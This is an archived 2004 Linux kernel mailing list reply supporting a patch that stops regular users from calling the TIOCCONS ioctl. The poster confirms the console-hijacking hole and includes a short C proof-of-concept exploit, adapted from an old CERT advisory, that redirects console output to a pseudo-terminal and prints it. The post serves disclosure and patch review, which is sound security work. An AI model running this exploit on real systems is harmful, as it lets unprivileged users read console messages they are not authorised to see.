Return-Path: <linux-kernel-owner+willy=40w.ods.org-S268844AbUHYVPV@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S268844AbUHYVPV (ORCPT <rfc822;willy@w.ods.org>);
	Wed, 25 Aug 2004 17:15:21 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S268703AbUHYVFR
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Wed, 25 Aug 2004 17:05:17 -0400
Received: from hera.kernel.org ([63.209.29.2]:30636 "EHLO hera.kernel.org")
	by vger.kernel.org with ESMTP id S268760AbUHYVDs (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Wed, 25 Aug 2004 17:03:48 -0400
To: linux-kernel@vger.kernel.org
From: Kees Cook <kees@osdl.org>
Subject: Re: [Patch] TIOCCONS security
Date: Wed, 25 Aug 2004 14:03:41 -0700
Organization: OSDL
Message-ID: <pan.2004.08.25.21.03.41.684647@osdl.org>
References: <20040825151106.GA21687@suse.de> <20040825161504.A8896@infradead.org> <20040825161630.B8896@infradead.org> <20040825161837.GB21687@suse.de>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Trace: build.pdx.osdl.net 1093467822 1841 172.20.1.16 (25 Aug 2004 21:03:42 GMT)
X-Complaints-To: abuse@osdl.org
NNTP-Posting-Date: Wed, 25 Aug 2004 21:03:42 +0000 (UTC)
User-Agent: Pan/0.14.2.91 (As She Crawled Across the Table (Debian GNU/Linux))
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

On Wed, 25 Aug 2004 18:18:37 +0200, Olaf Dabrunz wrote:
> The bottom line is, that I do not see why normal users should be able to
> use TIOCCONS. Hijacking console output is a security problem, which has
> been found quite some time ago on SunOS as well
> (http://www.cert.org/advisories/CA-1990-12.html).

Confirmed.  If you run the following code as a regular user, you can see
messages.  (BTW: don't do a "tail -f /dev/console".  For reasons I don't
understand, it writes endless CRs to which ever tty you happen to have
open):

# echo "ew. information leak." >> /dev/console


/* lifted from CA-1990-12 exploit code */
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <termio.h>
#include <errno.h>

main()
{
  int m,s;
  char buf[1024];
  char *l;
  size_t bytes;

  /* probably unused tty */
  static char lastpty[]="/dev/ptyvf";

  if((m=open(lastpty,O_RDWR)) == -1) {
    perror(lastpty);
    exit(1);
  }

  lastpty[5]='t';
  if((s=open(lastpty,O_RDWR)) == -1) {
    perror(lastpty);
    exit(1);
  }

  if(ioctl(s,TIOCCONS) == -1) {
    perror("TIOCONS");
    exit(1);
  }

  do {
    if ((bytes=read(m,buf,sizeof buf))<0 && errno!=EINTR)
          return 1;
    write(fileno(stdout),buf,bytes);
  } while (1);

  return 0;
}

